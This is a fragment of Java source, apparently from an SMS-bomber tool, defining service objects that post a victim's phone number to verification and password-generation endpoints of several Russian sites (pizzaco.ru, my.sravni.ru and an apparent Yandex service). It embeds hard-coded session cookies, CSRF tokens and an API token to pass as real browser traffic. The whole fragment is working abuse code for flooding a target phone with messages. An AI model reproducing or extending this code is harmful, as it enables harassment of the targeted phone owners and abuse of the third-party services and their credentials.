                    builder.header("Cookie", "font_loaded=YSv1; is_gdpr=0; is_gdpr_b=COTFARC5cygC; gdpr=0; _ym_uid=1643893010141416800; _ym_d=1652798146; font_loaded=YSv1; yandexuid=7914983681643893008; yuidss=7914983681643893008; ymex=1655575105.oyu.4959164461652775453#1968158134.yrts.1652798134; amcuid=4406858161652983118; skid=1064401191653123531; uniqueuid=345303361654276841; yabs-frequency=/5/0000000000000000/mvQrk4DCvt4KHoFkZ9N-eSoLP1H78__Xm84D2_T454SW/; i=BoH9u854W7rcxdsH1l7gnXMrG/rNSF6osrsaJi7J+YSMW5LrOBGPVdsAnThO3Ap70wSZnZ0HftNPf9fGySNC71OzFPc=; _ym_isad=2; L=e1x6f2x7ZF1fcGx2ZFxqQHxfUgliBFF7CTVYJUQ6JC85HVsQfXhu.1656576669.15024.344649.4788377edf08f876583a87093cc95a2f; pf=eyJmbGFzaCI6e319; pf.sig=WEkihpon3qfXt708UtZSzfT2k62TloAdz1jg6_iLs5Q; yp=1686928109.p_sw.1655392109#1970408029.multib.1#1655720081.mcv.0#1655720081.mcl.aoz1dd#1655720081.szm.1_25%3A1536x864%3A1536x754; ys=; yandex_login=; ilahu=1656605475; mda2_beacon=1656576675309; _yasc=Dw1CMDhU6jQl4Yg0s1m8EdqT54dHp6tbTxEMI47UCqFefOD6HZNaWbHe+ASHaA==; _ym_visorc=b; lah=2:1719649004.15118.eqsQT97eD404jHo5.3zS2y6V9HL6Ei_2p02ujTncoDyp_NHLXddv0Hn_JKMZal9Am75T--od3FDE6kA5BLDDNuCUI9vqgMu2VdfXulkxCM549kUtPVHI2Q8wOCGGU9UKaRmrhQLQLHRKI9Tkm83Lgm5bOCa8XT2E.k7e5D0R8UPb4XarYr_fFWQ");

                    return super.buildRequest(builder);
                }
            },

            new Service(7) {
                @Override
                public void run(OkHttpClient client, Callback callback) {
                    client.newCall(new Request.Builder()
                            .url("https://pizzaco.ru/api/user/generate-password")
                            .header("Cookie", "upkvartal-frontend=t466jslnqhsc8ffkaqlf65bnfg; _csrf-frontend=eca7110ac5f6820f172812ae76b93ea6f91976b5374d49b3e50823904e661505a%3A2%3A%7Bi%3A0%3Bs%3A14%3A%22_csrf-frontend%22%3Bi%3A1%3Bs%3A32%3A%22MqdE5DQapqSuoKww3kzp22qKVRklmP2O%22%3B%7D; _ym_uid=1656577574308706185; _ym_d=1656577574; _ym_visorc=w; _ym_isad=2; advanced-api=cm1ium0dmmq1nbveiinjdiku16; api-key=4e661934-f84e-11ec-9a5c-d00d1849d38c; app-settings=%7B%22promo_text%22%3Anull%2C%22cart_suggest_header%22%3Anull%2C%22seo_info%22%3A%7B%22title%22%3A%22%D0%93%D0%BB%D0%B0%D0%B2%D0%BD%D0%B0%D1%8F%22%2C%22description%22%3Anull%7D%2C%22auth_by_call%22%3Afalse%2C%22voice_call_auth%22%3Afalse%2C%22has_promo_advice%22%3Afalse%2C%22ask_address_on_first_enter%22%3Atrue%2C%22ask_address_on_add_to_cart%22%3Atrue%2C%22min_order_value%22%3A600%2C%22order_disable_card_for_weight%22%3Afalse%2C%22app_store_id%22%3A%22app%22%2C%22order_cart_to_courier%22%3Atrue%2C%22order_auth%22%3Afalse%2C%22takeaway_enabled%22%3Atrue%2C%22not_heat%22%3Afalse%2C%22default_persons_count%22%3A%221%22%2C%22order_to_time%22%3Afalse%2C%22show_not_call%22%3Afalse%2C%22order_show_persons%22%3Atrue%2C%22disable_order%22%3Afalse%2C%22default_phone%22%3A%22%2B7(812)220-01-02%22%2C%22auth_enabled%22%3Atrue%2C%22catalog_currency_symbol%22%3A%22%D0%A0%22%2C%22app_menu%22%3A%5B%7B%22id%22%3A10%2C%22title%22%3A%22%D0%9E%20%D0%BD%D0%B0%D1%81%22%2C%22type%22%3A20%2C%22target_id%22%3A%7B%22slug%22%3A%22o-nas%22%7D%7D%2C%7B%22id%22%3A11%2C%22title%22%3A%22%D0%94%D0%BE%D1%81%D1%82%D0%B0%D0%B2%D0%BA%D0%B0%20%D0%B8%20%D0%BE%D0%BF%D0%BB%D0%B0%D1%82%D0%B0%22%2C%22type%22%3A20%2C%22target_id%22%3A%7B%22slug%22%3A%22dostavka-i-oplata-mobil%22%7D%7D%5D%2C%22footer_menu%22%3A%5B%7B%22id%22%3A1%2C%22title%22%3A%22%D0%9E%20%D0%BD%D0%B0%D1%81%22%2C%22type%22%3A20%2C%22target_id%22%3A%7B%22slug%22%3A%22o-nas%22%7D%7D%2C%7B%22id%22%3A2%2C%22title%22%3A%22%D0%9A%D0%BE%D0%BD%D1%82%D0%B0%D0%BA%D1%82%D1%8B%22%2C%22type%22%3A20%2C%22target_id%22%3A%7B%22slug%22%3A%22kontakty%22%7D%7D%2C%7B%22id%22%3A8%2C%22title%22%3A%22%D0%90%D0%BA%D1%86%D0%B8%D0%B8%22%2C%22type%22%3A20%2C%22target_id%22%3A%7B%22slug%22%3A%22akcii%22%7D%7D%2C%7B%22id%22%3A9%2C%22title%22%3A%22%D0%94%D0%BE%D1%81%D1%82%D0%B0%D0%B2%D0%BA%D0%B0%20%D0%B8%20%D0%BE%D0%BF%D0%BB%D0%B0%D1%82%D0%B0%22%2C%22type%22%3A20%2C%22target_id%22%3A%7B%22slug%22%3A%22dostavka-i-oplata%22%7D%7D%5D%2C%22mobile_menu%22%3A%5B%7B%22id%22%3A5%2C%22title%22%3A%22%D0%9C%D0%B5%D0%BD%D1%8E%22%7D%2C%7B%22id%22%3A3%2C%22title%22%3A%22%D0%9E%20%D0%BD%D0%B0%D1%81%22%2C%22type%22%3A20%2C%22target_id%22%3A%7B%22slug%22%3A%22o-nas%22%7D%7D%2C%7B%22id%22%3A4%2C%22title%22%3A%22%D0%9A%D0%BE%D0%BD%D1%82%D0%B0%D0%BA%D1%82%D1%8B%22%2C%22type%22%3A20%2C%22target_id%22%3A%7B%22slug%22%3A%22kontakty%22%7D%7D%2C%7B%22id%22%3A6%2C%22title%22%3A%22%D0%90%D0%BA%D1%86%D0%B8%D0%B8%22%2C%22type%22%3A20%2C%22target_id%22%3A%7B%22slug%22%3A%22akcii%22%7D%7D%2C%7B%22id%22%3A7%2C%22title%22%3A%22%D0%94%D0%BE%D1%81%D1%82%D0%B0%D0%B2%D0%BA%D0%B0%20%D0%B8%20%D0%BE%D0%BF%D0%BB%D0%B0%D1%82%D0%B0%22%2C%22type%22%3A20%2C%22target_id%22%3A%7B%22slug%22%3A%22dostavka-i-oplata%22%7D%7D%5D%2C%22header_menu%22%3A%5B%5D%2C%22combine_promo_and_bonus%22%3Afalse%2C%22order_disable_cash%22%3Afalse%2C%22loyalty_program%22%3A%7B%22enabled%22%3Afalse%7D%2C%22whatsapp%22%3Anull%2C%22tg%22%3Anull%2C%22privacy_link%22%3Anull%2C%22promo_link%22%3A%22http%3A%2F%2Fabout.mnogolososya.ru%2Freceive_advertising%22%2C%22instagram%22%3Anull%2C%22vk%22%3Anull%2C%22facebook%22%3Anull%2C%22update_privacy%22%3Afalse%2C%22main_logo%22%3A%22https%3A%2F%2Fthapl-public.storage.yandexcloud.net%2F%2Fimg%2FSiteSetting%2F7eb85221f6c97c13f93532fffc1edc42_origin_.svg%22%2C%22additional_logo%22%3Anull%2C%22header_background%22%3A%22https%3A%2F%2Fstorage.yandexcloud.net%2Fthapl-public%2F%2Fimg%2FSiteSetting%2F74dff64b5b8cff080bc39a5678b2107d_origin.png%22%2C%22order_to_time_disable_holidays%22%3Atrue%2C%22order_to_time_min_gap_days%22%3A0%2C%22order_to_time_max_gap_days%22%3A2%2C%22start_up_promos%22%3A%5B%5D%2C%22check_region%22%3Afalse%7D")
                            .header("x-thapl-apitoken", "4e661934-f84e-11ec-9a5c-d00d1849d38c")
                            .post(RequestBody.create("------WebKitFormBoundaryMQ1naEW4T6mNqlQx\n" +
                                            "Content-Disposition: form-data; name=\"phone\"\n" +
                                            "\n" +
                                            format(phone, "+7 *** *** ** **\n") +
                                            "------WebKitFormBoundaryMQ1naEW4T6mNqlQx--",
                                    MediaType.parse("multipart/form-data; boundary=----WebKitFormBoundaryMQ1naEW4T6mNqlQx")))
                            .build()).enqueue(callback);
                }
            },

            new FormService("https://my.sravni.ru/signin/code") {
                @Override
                public void buildBody(FormBody.Builder builder) {
                    builder.add("__RequestVerificationToken", "CfDJ8CweUVAmnVJNqszqP15xx-hitFFEfBAUJnGvIZBqF4kqdB5DijYyQ1u0JbRmCq1dmVlRFqphQ6HElnEEqCPG4scR5SV47pVWqKe2anjUFfDfInYU_PqxRR-YmP-jRR5i9RjiExsOMk6554nFT1bXJDw");
                    builder.add("phone", "+" + getFormattedPhone());
                    builder.add("returnUrl", "/connect/authorize/callback?client_id=www&amp;scope=openid%20offline_access%20email%20phone%20profile%20roles%20reviews%20esia%20orders.r%20messagesender.sms%20Sravni.Reviews.Service%20Sravni.Osago.Service%20Sravni.QnA.Service%20Sravni.FileStorage.Service%20Sravni.PhoneVerifier.Service%20Sravni.Identity.Service%20Sravni.VZR.Service%20Sravni.Affiliates.Service%20Sravni.News.Service&amp;response_type=code%20id_token%20token&amp;redirect_uri=https%3A%2F%2Fwww.sravni.ru%2Fopenid%2Fcallback%2F&amp;response_mode=form_post&amp;state=aKMJO_u7seq0O8Z9swoMZNCxPQII1BQ3BXIcID0uDko&amp;nonce=GmzCt6zbp1YnZf9QHMmPR05NvwI3Cftm5or6YISMk0E&amp;login_hint&amp;acr_values");
                }

                @Override
                public Request buildRequest(Request.Builder builder) {
                    builder.header("Cookie", "_ym_uid=1648230902270232651; _ym_d=1652720791; .ASPXANONYMOUS=Wj7EH3nLFEqyHYYidQ77qw; _SL_=6.39.924.2529.; _ipl=6.39.924.2529.; __utmz=utmccn%3d(not%20set)%7cutmcct%3d(not%20set)%7cutmcmd%3d(none)%7cutmcsr%3d(direct)%7cutmctr%3d(not%20set); __utmx=utmccn%3d(not%20set)%7cutmcct%3d(not%20set)%7cutmcmd%3d(none)%7cutmcsr%3d(direct)%7cutmctr%3d(not%20set); AB_ACCIDENTINSURANCE=Test_000157_A; AB_ACCIDENTINSURANCE_DIRECT=never; AB_CREDITSELECTION=Test_000166_A; AB_CREDITSELECTION_DIRECT=never; _cfuvid=TKf4a7o.NTcTPY_jj3zbB16KROEpLGVqG0Imwqu3TEI-1656577933373-0-604800000; _ym_isad=2; __cf_bm=_M1xArnm.U77LAsOK_KlLRVFXulIg3HMgd..c9EiIY0-1656577934-0-AUVp6iX2Hs51aaQy+D9IHzsnLsF/EPMFijHTey8FTyQglJrrtTXU6dFRUj0vxr+RcG2AVwMko93NHqnHzk8Bz0g5PgqLJIdFv9rIikiW8R4PnhOLGnKUuDUbHL1/jAu1HnRMhV0JYn7iQgTltY9+qVjvFAYsGm7xArMGnX91PQXUkYOY18FgSDJ5n+/DoE5BpA==; _ga_WE262B3KPE=GS1.1.1656577934.1.0.1656577934.60; _ga=GA1.2.1897499837.1656577935; _gid=GA1.2.923198233.1656577935; _gat_UA-8755402-16=1; _dc_gtm_UA-8755402-14=1; _gcl_au=1.1.1765525680.1656577935; tmr_lvidTS=1648230904449; tmr_lvid=dbd59ad03175fd34d0f64f769fd0a5fd; uid=UbGokWK9X4+oKCNlCFuNAg==; .AspNetCore.Antiforgery.vnVzMy2Mv7Q=CfDJ8CweUVAmnVJNqszqP15xx-gMzc_APgAJ9lv4roObOleM7Ox8t2-vnQIlIJ-wYm7CCo8pj8IaZcFjEXe4o6mBvTybEccN7O-Aq8i7Z0iM9kfA0CCpVx-xprNiLnoRfIiWEMAq86LRrU2g-JUQ3RkFE_o; tmr_reqNum=11");

                    return super.buildRequest(builder);
                }
            }
    };
}
